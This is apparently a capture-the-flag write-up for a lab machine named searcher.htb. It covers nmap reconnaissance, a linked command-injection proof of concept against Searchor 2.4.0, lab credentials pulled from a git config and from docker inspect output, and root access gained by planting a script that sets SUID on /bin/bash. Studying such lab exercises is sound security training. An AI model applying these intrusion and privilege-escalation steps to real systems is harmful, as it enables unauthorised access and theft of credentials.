### IP
`10.10.11.208`

# Reconnaissance

### nmap

`nmap -sC -sV 10.10.11.208`
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 21:12 EDT
Nmap scan report for 10.10.11.208
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can add `searcher.htb` to `/etc/hosts` to see the website

On the bottom of the website, it says "`Powered by Flask and Searchor 2.4.0`"
	It seems that `Searchor 2.4.0` is [vulnerable to command injection](https://security.snyk.io/package/pip/searchor/2.4.0)


# Exploitation


I found a [POC](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) online


We can run `./exploit.sh searcher.htb <tun0>` and we get a shell as `svc@busqueda`

Theres a user flag in `/home/svc`

# Privilege Escalation

In the home directory, we can find a `.gitconfig` file that gives us an email of `cody@searcher.htb`

In webroot (`/var/www/app/`), we also find a `.git` directory, which indicates that it is a git repository. 

Here, there's a `config` file:

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
``` 

This gives us a password for the `cody` user on the `gitea.searcher.htb` as `jh1usoih2bkjaspwe92`
	We can add this subdomain into `/etc/hosts` and we see a website for `gitea`, which is a git web service.
	From here, we can log in as the `cody` user and we can see that there is also an `administrator` user and we can see the repo for the webapp we initially were on


I checked `/etc/passwd` to see if there was a cody user, but there wasn't, so I tried the password for `sudo -l` and it works:

```
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We can now see that the `svc` user can execute a python script as root. We also can now ssh into the `svc` user for a more stable shell since we have its password.

We can't read the python script or any of the files in the scripts directory, but we can run the script to get its usage:

```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

This allows us to see the running containers (with `docker-ps`) and also lets us run `docker inspect` (with `docker-inspect`)

One thing that I accidentally discovered was that the `full-checkup` option is probably trying to run `/opt/scripts/full-checkup.sh` using a relative path. 
	This is because running the python script from the wrong directory gives us the output `Something went wrong` but running it from `/opt/scripts` gives us output.
	This is what we end up exploiting to privesc, so I will explain the issue in more detail later. 

Running `docker-ps` provides some useful information by showing us which ports are exposed and showing the names of the images that the containers are based on.
	We can see a web service (gitea) and mysql

Running the python script with `docker-inspect` gives us the following usage:

```
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

We have the docker container IDs from `docker-ps`, so now we just have to find out what the format means. I looked it up online and found [the docker reference for the inspect command](https://docs.docker.com/engine/reference/commandline/inspect/)


There are several useful outputs, but the most useful one was `{{json .Config}}`, which gets the entire docker config as json.
	Something I realized later is that we also could have just used `{{.Config}}`, which would have printed the config as well 

This config includes credentials to sensitive things like the mysql password, as shown below:


`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a`
```json
{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e`
```json
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```


Here is some of the useful information we got:
```
MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF

MYSQL_USER=gitea
MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
```


Based on this, I tried logging into the database from the machine but wasn't able to. I also tried using the credentials to log in to root, but that didn't work either.

However, if we test the `yuiu1hoiu4i5ho1uh` password with the `administrator` user on gitea, we get access.
	This allows us to read the contents of the files in `/opt/scripts`

The vulnerable part of the `system-checkup.py` script is shown below:

```python
elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

Note that the `full-checkup` command runs `./full-checkup.sh` as a relative, rather than absolute, path. This is something we guessed earlier, but this confirms it. 

This also shows why we were getting `Something went wrong` as a result. The directory we were running from didn't have the script in it. 

Thus, because we can run the python script as sudo and it will spawn a child process using `./full-checkup.sh`, we can just make our own `full-checkup.sh` script to privesc.

I used the following:

```bash
#!/bin/bash

chmod +s /bin/bash
````

From here, we can run `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` and we can notice that bash is now an suid binary.

We can then run bash with privileges using `bash -p` and we have a root shell.

There is a flag in `/root/root.txt`